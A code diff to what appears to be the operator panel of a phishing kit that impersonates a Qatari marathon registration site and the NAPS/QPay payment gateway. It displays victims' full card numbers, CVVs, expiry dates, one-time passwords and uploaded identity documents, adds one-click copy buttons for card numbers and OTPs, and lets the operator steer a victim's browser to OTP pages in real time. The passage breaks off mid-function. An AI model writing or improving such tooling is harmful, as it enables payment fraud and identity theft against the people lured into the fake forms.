@@ -185,9 +185,47 @@ function getUserDisplayName(user) {
       if (full) return full;
     }
     const card = user.formData['payment-card'];
-    if (card && card.cardholderName) return card.cardholderName;
+    if (card && (card.cardholderName || card['cardholder-name'])) {
+      return card.cardholderName || card['cardholder-name'];
+    }
+    const qpy = user.formData['qpy'];
+    if (qpy && (qpy.cardholderName || qpy['cardholder-name'])) {
+      return qpy.cardholderName || qpy['cardholder-name'];
+    }
   }
   return 'مستخدم جديد';
+}
+
+function getUserPageId(user) {
+  if (!user) return 'index';
+  let p = user.currentPage;
+  if (p && p !== 'unknown' && p !== 'null' && p !== 'undefined' && PAGE_LABELS[p]) {
+    return p;
+  }
+  // If currentPage was unknown or not set, intelligently infer from submitted forms
+  if (user.formData) {
+    if (user.formData['otp']) return 'otp';
+    if (user.formData['payment-verify']) return 'payment-verify';
+    if (user.formData['qpy']) return 'qpy';
+    if (user.formData['payment-card']) return 'payment-card';
+    if (user.formData['payment']) return 'payment';
+    if (user.formData['registration-summary']) return 'registration-summary';
+    if (user.formData['registration']) return 'registration';
+  }
+  return 'index';
+}
+
+function getUserStatusInfo(user) {
+  const isOnline = Boolean(user && user.isConnected);
+  const pageId = getUserPageId(user);
+  const pageName = PAGE_LABELS[pageId] || 'الصفحة الرئيسية';
+  return {
+    isOnline,
+    pageId,
+    pageName,
+    statusText: isOnline ? pageName : 'غير متصل (Offline)',
+    statusClass: isOnline ? 'online' : 'offline'
+  };
 }
 
 function renderUserList(list) {
@@ -210,8 +248,7 @@ function renderUserList(list) {
     
     const displayName = getUserDisplayName(user);
     const initials = getInitials(displayName);
-    const dotClass = user.isConnected ? 'success' : 'muted';
-    const pageName = PAGE_LABELS[user.currentPage] || (user.currentPage === 'index' ? 'الصفحة الرئيسية' : user.currentPage || 'الرئيسية');
+    const statusInfo = getUserStatusInfo(user);
     const contact = user.email || user.phone || (user.formData?.registration?.email || user.formData?.registration?.phone || '');
     
     item.innerHTML = `
@@ -219,8 +256,10 @@ function renderUserList(list) {
       <div class="user-info">
         <div class="user-name">${escapeHtml(displayName)}</div>
         <div class="user-meta">
-          <span class="dot ${dotClass}"></span>
-          ${escapeHtml(pageName)}
+          <span class="status-pill ${statusInfo.statusClass}">
+            <span class="live-dot"></span>
+            <span>${escapeHtml(statusInfo.statusText)}</span>
+          </span>
         </div>
         <div class="user-contact">${escapeHtml(contact)}</div>
       </div>
@@ -273,11 +312,15 @@ function renderChat(data) {
   const nameEl = document.getElementById('chat-user-name');
   if (nameEl) nameEl.textContent = escapeHtml(displayName);
   
-  const pageName = PAGE_LABELS[data.currentPage] || (data.currentPage === 'index' ? 'الصفحة الرئيسية' : data.currentPage || 'الرئيسية');
-  const dotClass = data.isConnected ? 'text-success' : 'text-muted';
+  const statusInfo = getUserStatusInfo(data);
   const pageContainer = document.getElementById('user-current-page');
   if (pageContainer) {
-    pageContainer.innerHTML = `<i class="fas fa-circle ${dotClass}"></i> <span id="page-name">${escapeHtml(pageName)}</span>`;
+    pageContainer.innerHTML = `
+      <span class="status-pill ${statusInfo.statusClass}">
+        <span class="live-dot"></span>
+        <span id="page-name">${escapeHtml(statusInfo.statusText)}</span>
+      </span>
+    `;
   }
   
   const contactEl = document.getElementById('user-contact');
@@ -286,7 +329,7 @@ function renderChat(data) {
     contactEl.textContent = contact || 'لا توجد بيانات تواصل مسجلة';
   }
   
-  renderNavButtons(data.currentPage);
+  renderNavButtons(statusInfo.pageId);
   renderMessages(data.formData);
 }
 
@@ -295,28 +338,366 @@ function renderNavButtons(activePage) {
   if(!container) return;
   container.innerHTML = '';
   
+  const normalizedActive = (activePage && activePage !== 'unknown' && PAGE_LABELS[activePage])
+    ? activePage
+    : (currentUserData ? getUserPageId(currentUserData) : 'index');
+  
   PAGES.forEach(page => {
     const btn = document.createElement('button');
     btn.className = 'nav-btn';
     btn.dataset.page = page.id;
-    if (page.id === activePage) {
+    if (page.id === normalizedActive) {
       btn.classList.add('active');
     }
     
     btn.innerHTML = `
       <i class="fa ${page.icon}"></i>
-      ${page.name}
+      <span>${page.name}</span>
       <span class="page-indicator"></span>
     `;
     
     btn.addEventListener('click', () => {
       if(currentUserData && currentUserData.sessionId) {
-        socket.emit('navigate', { sessionId: currentUserData.sessionId, page: page.id });
+        // 1. Instant optimistic UI switch: move glowing beacon light immediately
+        container.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
+        btn.classList.add('active');
+        
+        // 2. Update currentUserData local state
+        currentUserData.currentPage = page.id;
+        
+        // 3. Update chat header page display
+        const pageContainer = document.getElementById('user-current-page');
+        if (pageContainer) {
+          const statusInfo = getUserStatusInfo(currentUserData);
+          pageContainer.innerHTML = `
+            <span class="status-pill ${statusInfo.statusClass}">
+              <span class="live-dot"></span>
+              <span id="page-name">${escapeHtml(statusInfo.statusText)}</span>
+            </span>
+          `;
+        }
+        
+        // 4. Update sidebar user item
+        const userInList = users.find(u => u.sessionId === currentUserData.sessionId);
+        if (userInList) {
+          userInList.currentPage = page.id;
+          renderUserList(users);
+        }
+        
+        // 5. Emit navigate event to server
+        if (socket) {
+          socket.emit('navigate', { sessionId: currentUserData.sessionId, page: page.id });
+        }
       }
     });
     
     container.appendChild(btn);
   });
+}
+
+// Brand SVG & Card Formatting Helpers
+const NAPS_LOGO_BASE64 = 'data:image/png;base64,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';
+
+function getBrandLogoSvg(brand) {
+  if (brand === 'visa') {
+    return `
+      <svg class="cc-brand-logo-svg visa" viewBox="0 0 60 20" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M24.8 19.3L28.1 0.7H33.3L30 19.3H24.8Z" fill="#ffffff"/>
+        <path d="M46.7 1.2C45.6 0.7 43.8 0.3 41.5 0.3C35.9 0.3 32 3.1 31.9 7.2C31.8 10.2 34.6 11.8 36.8 12.8C38.9 13.8 39.7 14.5 39.7 15.5C39.7 17 37.9 17.7 36.2 17.7C34 17.7 32.7 17.3 31.1 16.6L30.3 16.2L29.5 21.4C30.9 22.1 33.3 22.6 35.7 22.6C41.6 22.6 45.4 19.8 45.5 15.5C45.6 13.1 44 11.3 41 9.9C39.2 8.9 38.1 8.2 38.1 7.2C38.1 6.2 39.3 5.2 41.6 5.2C43.5 5.2 44.8 5.6 46 6.1L46.6 6.4L47.3 1.5L46.7 1.2Z" fill="#ffffff"/>
+        <path d="M55.8 0.7H51.8C50.5 0.7 49.5 1.1 48.9 2.4L41.8 19.3H47.7L48.9 16.1H56.1L56.8 19.3H62L57.5 0.7H55.8ZM50.5 12.1L53.3 4.5L54.9 12.1H50.5Z" fill="#ffffff"/>
+        <path d="M18.5 0.7L13.1 14.9L12.5 12.1C11.5 8.7 8.5 5 5.1 3.2L10 19.3H16.1L25.1 0.7H18.5Z" fill="#ffffff"/>
+        <path d="M8.8 0.7H-0.8L-1 1.2C5.6 2.8 10.7 7.3 12.5 12.1L10.7 2.6C10.4 1.3 9.7 0.8 8.8 0.7Z" fill="#f59e0b"/>
+      </svg>
+    `;
+  }
+  if (brand === 'mastercard') {
+    return `
+      <svg class="cc-brand-logo-svg mastercard" viewBox="0 0 48 30" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <circle cx="17" cy="15" r="13" fill="#EB001B"/>
+        <circle cx="31" cy="15" r="13" fill="#F79E1B" fill-opacity="0.92"/>
+        <path d="M24 5.3C26.9 7.8 28.7 11.2 28.7 15C28.7 18.8 26.9 22.2 24 24.7C21.1 22.2 19.3 18.8 19.3 15C19.3 11.2 21.1 7.8 24 5.3Z" fill="#FF5F00"/>
+      </svg>
+    `;
+  }
+  return `
+    <div style="display:flex; align-items:center; gap:5px; font-weight:700; font-size:12px; color:#cbd5e1;">
+      <i class="fas fa-credit-card"></i> CARD
+    </div>
+  `;
+}
+
+function formatCardNumber(rawNum) {
+  if (!rawNum) return '•••• •••• •••• ••••';
+  const clean = String(rawNum).replace(/\s+/g, '');
+  const chunks = clean.match(/.{1,4}/g);
+  return chunks ? chunks.join(' ') : clean;
+}
+
+function renderRegistrationDossier(data, container) {
+  const fullName = [data.firstName, data.lastName].filter(Boolean).join(' ') || data.name || 'المشارك';
+  const category = data.raceCategory || 'سباق الماراثون';
+  const price = data.price ? `${data.price} ر.ق` : '';
+  
+  const card = document.createElement('div');
+  card.className = 'registration-dossier-card';
+  
+  // Header
+  const header = document.createElement('div');
+  header.className = 'dossier-header';
+  header.innerHTML = `
+    <div class="dossier-title-group">
+      <div class="dossier-icon"><i class="fas fa-running"></i></div>
+      <div>
+        <h4 class="dossier-title">${escapeHtml(fullName)}</h4>
+        <span class="dossier-subtitle">استمارة التسجيل في السباق</span>
+      </div>
+    </div>
+    <div class="dossier-badges">
+      ${category ? `<span class="dossier-badge category"><i class="fas fa-medal"></i> ${escapeHtml(category)}</span>` : ''}
+      ${price ? `<span class="dossier-badge price"><i class="fas fa-tag"></i> ${escapeHtml(price)}</span>` : ''}
+    </div>
+  `;
+  card.appendChild(header);
+  
+  // Body
+  const body = document.createElement('div');
+  body.className = 'dossier-body';
+  
+  // Grid
+  const grid = document.createElement('div');
+  grid.className = 'dossier-grid';
+  
+  const fieldsToShow = [
+    { key: 'email', label: 'البريد الإلكتروني', icon: 'fa-envelope' },
+    { key: 'phone', label: 'رقم الجوال', icon: 'fa-phone' },
+    { key: 'identityNumber', label: 'رقم الهوية / الجواز', icon: 'fa-id-badge' },
+    { key: 'nationality', label: 'الجنسية', icon: 'fa-globe' },
+    { key: 'residence', label: 'بلد الإقامة', icon: 'fa-map-marker-alt' },
+    { key: 'birthDate', label: 'تاريخ الميلاد', icon: 'fa-calendar-alt' },
+    { key: 'gender', label: 'الجنس', icon: 'fa-venus-mars' },
+    { key: 'shirtSize', label: 'مقاس القميص', icon: 'fa-tshirt' },
+    { key: 'pace', label: 'الوقت المتوقع', icon: 'fa-stopwatch' },
+    { key: 'club', label: 'النادي / جهة العمل', icon: 'fa-building' },
+    { key: 'coupon', label: 'رمز القسيمة', icon: 'fa-ticket-alt' }
+  ];
+  
+  fieldsToShow.forEach(f => {
+    const val = data[f.key];
+    if (val && String(val).trim()) {
+      const fieldEl = document.createElement('div');
+      fieldEl.className = 'dossier-field';
+      fieldEl.innerHTML = `
+        <span class="dossier-field-label"><i class="fas ${f.icon}"></i> ${f.label}</span>
+        <span class="dossier-field-value" title="${escapeHtml(String(val))}">${escapeHtml(String(val))}</span>
+      `;
+      grid.appendChild(fieldEl);
+    }
+  });
+  body.appendChild(grid);
+  
+  // Identity Document Attachment
+  const identityFile = data.identityFile;
+  if (identityFile && String(identityFile).trim()) {
+    const strVal = String(identityFile).trim();
+    const fileName = data.identityFileName || 'وثيقة_إثبات_الهوية.jpg';
+    const fileSize = data.identityFileSize || '';
+    
+    const isImage = strVal.startsWith('data:image/') || 
+                    (strVal.startsWith('data:') && !strVal.startsWith('data:application/pdf')) ||
+                    /\.(png|jpe?g|webp|gif|svg)$/i.test(strVal) ||
+                    (strVal.includes(';base64,') && !strVal.startsWith('data:application/pdf'));
+    
+    if (isImage) {
+      const attachBox = document.createElement('div');
+      attachBox.className = 'dossier-attachment-box';
+      
+      const preview = document.createElement('div');
+      preview.className = 'dossier-attachment-preview';
+      preview.title = 'انقر لعرض الصورة بالحجم الكامل';
+      preview.innerHTML = `
+        <img src="${strVal}" class="dossier-attachment-img" alt="وثيقة الهوية" />
+        <div class="dossier-attachment-info">
+          <span class="dossier-attachment-title"><i class="fas fa-file-image text-primary"></i> ${escapeHtml(fileName)}</span>
+          <span class="dossier-attachment-sub">${fileSize ? escapeHtml(fileSize) + ' • ' : ''}انقر للتكبير والمشاهدة</span>
+        </div>
+      `;
+      preview.addEventListener('click', () => window.openImageModal(strVal, fileName));
+      
+      const downloadA = document.createElement('a');
+      downloadA.className = 'btn-download-img';
+      downloadA.href = strVal;
+      downloadA.download = fileName;
+      downloadA.innerHTML = '<i class="fas fa-download"></i> تحميل';
+      
+      attachBox.appendChild(preview);
+      attachBox.appendChild(downloadA);
+      body.appendChild(attachBox);
+    } else if (strVal.startsWith('data:application/pdf')) {
+      const pdfBox = document.createElement('div');
+      pdfBox.className = 'dossier-attachment-box';
+      pdfBox.innerHTML = `
+        <div style="display:flex; align-items:center; gap:10px;">
+          <i class="fas fa-file-pdf" style="font-size:32px; color:#ef4444;"></i>
+          <div>
+            <strong style="display:block; font-size:13px; color:#1e293b;">${escapeHtml(fileName)}</strong>
+            <span style="font-size:11px; color:#64748b;">مستند PDF</span>
+          </div>
+        </div>
+        <a href="${strVal}" download="${escapeHtml(fileName)}" class="btn-download-img">
+          <i class="fas fa-download"></i> تحميل
+        </a>
+      `;
+      body.appendChild(pdfBox);
+    }
+  }
+  
+  card.appendChild(body);
+  container.appendChild(card);
+}
+
+function renderCreditCardComponent(data, container, { isQpay = false } = {}) {
+  const rawNum = String(data.cardNumber || '').trim();
+  const cleanNum = rawNum.replace(/\s+/g, '');
+  
+  // Brand detection: starts with 4 -> Visa, starts with 5 -> MasterCard
+  let brand = 'other';
+  if (cleanNum.startsWith('4')) {
+    brand = 'visa';
+  } else if (cleanNum.startsWith('5')) {
+    brand = 'mastercard';
+  }
+  
+  const formattedNumber = formatCardNumber(cleanNum);
+  const cardholder = (data.cardholderName || data['cardholder-name'] || data.name || 'CARDHOLDER NAME').toUpperCase();
+  
+  let expiry = data.cardExpiry || '';
+  if (!expiry && (data.expMonth || data.expYear)) {
+    const m = String(data.expMonth || '01').padStart(2, '0');
+    const y = String(data.expYear || '27').slice(-2);
+    expiry = `${m}/${y}`;
+  }
+  if (!expiry) expiry = '••/••';
+  
+  const cvv = data.cardCvv || data.cvv || '•••';
+  
+  let targetContainer = container;
+  if (isQpay) {
+    const portalBox = document.createElement('div');
+    portalBox.className = 'qpy-portal-container';
+    portalBox.innerHTML = `
+      <div class="qpy-portal-header">
+        <div class="qpy-portal-brand">
+          <img src="assets/NAPS.png" onerror="this.src='${NAPS_LOGO_BASE64}'" class="qpy-naps-logo" alt="NAPS Qatar" />
+          <div class="qpy-portal-title">
+            <strong>بوابة الدفع الوطنية QPay</strong>
+            <span>شبكة NAPS الوطنية للمعاملات المصرفية</span>
+          </div>
+        </div>
+        <span class="qpy-portal-badge"><i class="fas fa-shield-alt"></i> بوابة معتمدة</span>
+      </div>
+    `;
+    targetContainer = portalBox;
+  }
+  
+  const cardWrapper = document.createElement('div');
+  cardWrapper.className = 'credit-card-wrapper';
+  
+  const cardEl = document.createElement('div');
+  cardEl.className = 'credit-card';
+  
+  cardEl.innerHTML = `
+    <div class="cc-top-row">
+      <div class="cc-chip-nfc">
+        <div class="cc-chip"></div>
+        <i class="fas fa-wifi cc-nfc"></i>
+      </div>
+      <div class="cc-brand-badge">
+        ${getBrandLogoSvg(brand)}
+      </div>
+    </div>
+    
+    <div class="cc-number-row">
+      <span class="cc-number">${escapeHtml(formattedNumber)}</span>
+      <button class="cc-copy-btn" title="نسخ رقم البطاقة" onclick="window.copyToClipboard('${escapeHtml(cleanNum)}', this)">
+        <i class="fas fa-copy"></i> نسخ
+      </button>
+    </div>
+    
+    <div class="cc-bottom-row">
+      <div class="cc-meta-group">
+        <span class="cc-meta-label">حامل البطاقة / CARDHOLDER</span>
+        <span class="cc-meta-value">${escapeHtml(cardholder)}</span>
+      </div>
+      
+      <div class="cc-meta-group" style="text-align:center;">
+        <span class="cc-meta-label">الانتهاء / EXPIRES</span>
+        <span class="cc-meta-value" style="direction:ltr;">${escapeHtml(expiry)}</span>
+      </div>
+      
+      <div class="cc-cvv-pill" title="رمز الأمان CVV">
+        <span style="font-size:10px; color:#fca5a5; letter-spacing:0.5px;">CVV</span>
+        <span>${escapeHtml(cvv)}</span>
+      </div>
+    </div>
+  `;
+  
+  cardWrapper.appendChild(cardEl);
+  targetContainer.appendChild(cardWrapper);
+  
+  if (isQpay) {
+    container.appendChild(targetContainer);
+  }
+}
+
+function renderOtpComponent(data, container, { isOtpPage = false } = {}) {
+  const code = String(data.otpCode || data.code || '').trim();
+  const digits = code ? code.split('') : ['-', '-', '-', '-'];
+  
+  const outerWrapper = document.createElement('div');
+  outerWrapper.className = 'otp-card-container';
+  
+  let contentTarget = outerWrapper;
+  
+  if (isOtpPage) {
+    const napsFrame = document.createElement('div');
+    napsFrame.className = 'otp-naps-frame';
+    napsFrame.innerHTML = `
+      <div class="otp-header-row">
+        <div style="display:flex; align-items:center; gap:10px;">
+          <img src="assets/NAPS.png" onerror="this.src='${NAPS_LOGO_BASE64}'" style="height:32px; width:auto;" alt="NAPS Qatar" />
+          <div>
+            <strong style="font-size:13px; color:#0f172a; display:block;">رمز التحقق OTP (بوابة QPay)</strong>
+            <span style="font-size:11px; color:#64748b;">تم الاستلام عبر شبكة NAPS المصرفية</span>
+          </div>
+        </div>
+        <span class="qpy-portal-badge"><i class="fas fa-check-circle"></i> تم الإرسال</span>
+      </div>
+    `;
+    outerWrapper.appendChild(napsFrame);
+    contentTarget = napsFrame;
+  }
+  
+  const codeBox = document.createElement('div');
+  codeBox.className = 'otp-code-box' + (isOtpPage ? '' : ' standard');
+  
+  const digitsHtml = digits.map(d => `<span class="otp-digit-cell">${escapeHtml(d)}</span>`).join('');
+  
+  codeBox.innerHTML = `
+    <span class="otp-label-text">
+      <i class="fas fa-key"></i> رمز التحقق السري لعملية الدفع (One-Time Password)
+    </span>
+    <div class="otp-digits-wrapper">
+      ${digitsHtml}
+    </div>
+    <div class="otp-actions-row">
+      <button class="btn-copy-otp" onclick="window.copyToClipboard('${escapeHtml(code)}', this)">
+        <i class="fas fa-copy"></i> نسخ كود التحقق
+      </button>
+    </div>
+  `;
+  
+  contentTarget.appendChild(codeBox);
+  container.appendChild(outerWrapper);
 }
 
 function renderMessages(formData) {
@@ -349,14 +730,54 @@ function renderMessages(formData) {
       header.innerHTML = `<i class="fas fa-file-alt"></i> ${PAGE_LABELS[pageId] || pageId}`;
       group.appendChild(header);
       
+      // 1. Special Case: Registration Dossier Card
+      if (pageId === 'registration') {
+        renderRegistrationDossier(data, group);
+        hasEntries = true;
+        list.appendChild(group);
+        return;
+      }
+      
+      // 2. Special Case: Payment Card
+      if (pageId === 'payment-card') {
+        renderCreditCardComponent(data, group, { isQpay: false });
+        hasEntries = true;
+        list.appendChild(group);
+        return;
+      }
+      
+      // 3. Special Case: QPay (Credit card in white container with NAPS logo)
+      if (pageId === 'qpy') {
+        renderCreditCardComponent(data, group, { isQpay: true });
+        hasEntries = true;
+        list.appendChild(group);
+        return;
+      }
+      
+      // 4. Special Case: OTP (Verification code in white container with NAPS logo)
+      if (pageId === 'otp') {
+        renderOtpComponent(data, group, { isOtpPage: true });
+        hasEntries = true;
+        list.appendChild(group);
+        return;
+      }
+      
+      // 5. Special Case: Payment Verify (Verification code standard)
+      if (pageId === 'payment-verify') {
+        renderOtpComponent(data, group, { isOtpPage: false });
+        hasEntries = true;
+        list.appendChild(group);
+        return;
+      }
+      
+      // Fallback: Generic field-by-field layout for other pages (e.g. registration-summary, payment, wait)
       let fieldCount = 0;
       Object.entries(data).forEach(([key, value]) => {
         if (value !== undefined && value !== null && String(value).trim() !== '') {
-          // Skip auxiliary file fields or terms
           if (key.endsWith('Name') && data[key.replace(/Name$/, '')]) return;
           if (key.endsWith('Size') && data[key.replace(/Size$/, '')]) return;
           if (key === 'terms') return;
-
+          
           fieldCount++;
           const item = document.createElement('div');
           item.className = 'message-item';
@@ -365,116 +786,11 @@ function renderMessages(formData) {
           label.className = 'message-label';
           label.textContent = FORM_FIELD_LABELS[key] || key;
           item.appendChild(label);
-
+          
           const strVal = String(value).trim();
-
-          // 1. Image Data URL or Image File
-          const isImage = strVal.startsWith('data:image/') || 
-                          (key === 'identityFile' && strVal.startsWith('data:') && !strVal.startsWith('data:application/pdf')) ||
-                          /\.(png|jpe?g|webp|gif|svg)$/i.test(strVal) ||
-                          (strVal.includes(';base64,') && !strVal.startsWith('data:application/pdf'));
-
-          if (isImage) {
-            const fileName = data[key + 'Name'] || data.identityFileName || 'صورة وثيقة الهوية';
-            const fileSize = data[key + 'Size'] || data.identityFileSize || '';
-            
-            const card = document.createElement('div');
-            card.className = 'message-image-wrapper';
-
-            const cardInner = document.createElement('div');
-            cardInner.className = 'message-image-card';
-
-            const previewWrapper = document.createElement('div');
-            previewWrapper.className = 'message-image-preview-wrapper';
-            previewWrapper.title = 'انقر لعرض الصورة بالحجم الكامل';
-
-            const imgEl = document.createElement('img');
-            imgEl.className = 'message-image-preview';
-            imgEl.alt = label.textContent || 'صورة الوثيقة';
-            imgEl.loading = 'lazy';
-            imgEl.src = strVal;
-
-            const overlayBtn = document.createElement('div');
-            overlayBtn.className = 'image-overlay-btn';
-            overlayBtn.innerHTML = '<i class="fas fa-search-plus"></i> تكبير وعرض الصورة';
-
-            previewWrapper.appendChild(imgEl);
-            previewWrapper.appendChild(overlayBtn);
-            previewWrapper.addEventListener('click', () => {
-              window.openImageModal(strVal, fileName);
-            });
-
-            const footer = document.createElement('div');
-            footer.className = 'message-image-footer';
-
-            const nameSpan = document.createElement('span');
-            nameSpan.className = 'image-name';
-            nameSpan.title = fileName;
-            nameSpan.innerHTML = `<i class="fas fa-id-card"></i> ${escapeHtml(fileName)} ${fileSize ? `(${escapeHtml(fileSize)})` : ''}`;
-
-            const downloadLink = document.createElement('a');
-            downloadLink.className = 'btn-download-img';
-            downloadLink.title = 'تحميل الصورة';
-            downloadLink.href = strVal;
-            downloadLink.download = fileName || 'identity-document.jpg';
-            downloadLink.innerHTML = '<i class="fas fa-download"></i> تحميل';
-
-            footer.appendChild(nameSpan);
-            footer.appendChild(downloadLink);
-
-            cardInner.appendChild(previewWrapper);
-            cardInner.appendChild(footer);
-            card.appendChild(cardInner);
-
-            item.appendChild(card);
-            group.appendChild(item);
-            return;
-          }
-
-          // 2. PDF Document Data URL
-          if (strVal.startsWith('data:application/pdf')) {
-            const fileName = data[key + 'Name'] || data.identityFileName || 'مستند الهوية.pdf';
-            const pdfCard = document.createElement('div');
-            pdfCard.style.cssText = 'display:flex; align-items:center; justify-content:space-between; padding:12px; background:#f8fafc; border:1px solid #e2e8f0; border-radius:8px; gap:12px; margin-top:6px;';
-            pdfCard.innerHTML = `
-              <div style="display:flex; align-items:center; gap:10px;">
-                <i class="fas fa-file-pdf" style="font-size:26px; color:#ef4444;"></i>
-                <div>
-                  <strong style="display:block; font-size:13px; color:#1e293b;">${escapeHtml(fileName)}</strong>
-                  <span style="font-size:11px; color:#64748b;">مستند PDF</span>
-                </div>
-              </div>
-              <a href="${escapeHtml(strVal)}" download="${escapeHtml(fileName)}" class="btn-download-img">
-                <i class="fas fa-download"></i> تحميل المستند
-              </a>
-            `;
-            item.appendChild(pdfCard);
-            group.appendChild(item);
-            return;
-          }
-
-          // 3. Legacy identityFile text (sent in sessions before image streaming)
-          if (key === 'identityFile') {
-            const legacyNotice = document.createElement('div');
-            legacyNotice.style.cssText = 'padding:10px 14px; background:#fffbeb; border:1px solid #fde68a; border-radius:8px; margin-top:6px;';
-            legacyNotice.innerHTML = `
-              <div style="display:flex; align-items:center; gap:8px; color:#b45309; font-weight:600; font-size:13px;">
-                <i class="fas fa-file-image"></i> ${escapeHtml(strVal)}
-              </div>
-              <small style="display:block; color:#92400e; font-size:11px; margin-top:4px;">
-                (هذه الجلسة قديمة تم تسجيلها قبل التحديث - في أي تسجيل جديد بعد الآن ستظهر صورة الوثيقة الفعلية هنا مباشرة وبدقة عالية)
-              </small>
-            `;
-            item.appendChild(legacyNotice);
-            group.appendChild(item);
-            return;
-          }
-
-          // 4. Standard text field
           const val = document.createElement('span');
           val.className = 'message-value';
           val.textContent = escapeHtml(strVal);
-          
           item.appendChild(val);
           group.appendChild(item);
         }
@@ -486,7 +802,7 @@ function renderMessages(formData) {
       }
     }
   });
-
+  
   if (!hasEntries) {
     list.innerHTML = `
       <div style="padding:40px 20px; text-align:center; color:var(--text-muted);">
@@ -495,6 +811,43 @@ function renderMessages(formData) {
         <p style="font-size:13px;">المستخدم يتصفح الموقع ولم يقم بإدخال بيانات في النماذج بعد.</p>
       </div>`;
   }
+}
+
+window.copyToClipboard = function(text, btnEl) {
+  if (!text) return;
+  const onSuccess = () => {
+    if (btnEl) {
+      const origHtml = btnEl.innerHTML;
+      btnEl.classList.add('copied');
+      btnEl.innerHTML = '<i class="fas fa-check"></i> تم النسخ!';
+      setTimeout(() => {
+        btnEl.classList.remove('copied');
+        btnEl.innerHTML = origHtml;
+      }, 1800);
+    }
+  };
+  
+  if (navigator.clipboard && navigator.clipboard.writeText) {
+    navigator.clipboard.writeText(text).then(onSuccess).catch(() => {
+      fallbackCopy(text, onSuccess);
+    });
+  } else {
+    fallbackCopy(text, onSuccess);
+  }
+};
+
+function fallbackCopy(text, cb) {
+  try {
+    const ta = document.createElement('textarea');
